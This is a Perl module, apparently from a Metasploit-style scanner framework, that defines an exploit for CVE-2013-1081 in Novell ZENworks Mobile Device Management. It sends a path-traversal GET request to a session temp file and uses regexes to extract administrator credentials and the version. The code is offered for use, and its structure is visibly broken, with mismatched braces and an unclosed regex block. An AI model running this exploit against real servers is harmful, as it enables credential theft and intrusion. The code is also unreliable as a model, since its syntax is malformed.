package MSFExploits::Exploits::NOVELL::MSF::NovellMdmCreds;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::NOVELL);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "NovellMdmCreds";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-1081",
  DESCRIPTION => "

        This module attempts to pull the administrator credentials from

        a vulnerable Novell Zenworks MDM server.

      ",
  METHOD => "GET",
  MSF_MODULE => "novell_mdm_creds",
  OSVDB => 91119,
  PATH => "language=res/languages/../../../../php/temp/sess___SESSION_ID__&cmd_var=__CMD_VAR__&",
  PATHS => [""],
  REFERENCES => ["http://www.novell.com/support/kb/doc.php?id=7011895"],
  TITLE => "Novell Zenworks Mobile Device Managment Admin Credentials",
  VARIABLES => {
    'SESS' =>       { DESCRIPTION => "", VALUE => "" },
    'CMD' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Path to the Novell Zenworks MDM install",
  VALUE => "/",
},
    'CREDS' =>       { DESCRIPTION => "", VALUE => "" },
    'VERSION' =>       { DESCRIPTION => "", VALUE => "" },
    'CMD_VAR' =>       { DESCRIPTION => "", VALUE => "" },
    'SESSION_ID' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  REGEXES => {
    'CREDS' => {
      MATCHES =>       ".*:\"\\(.*\\)\";.*\";",
    },    'VERSION' => {
      MATCHES =>       "<p id=\"version\">Version \\(.*\\)<\\",

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
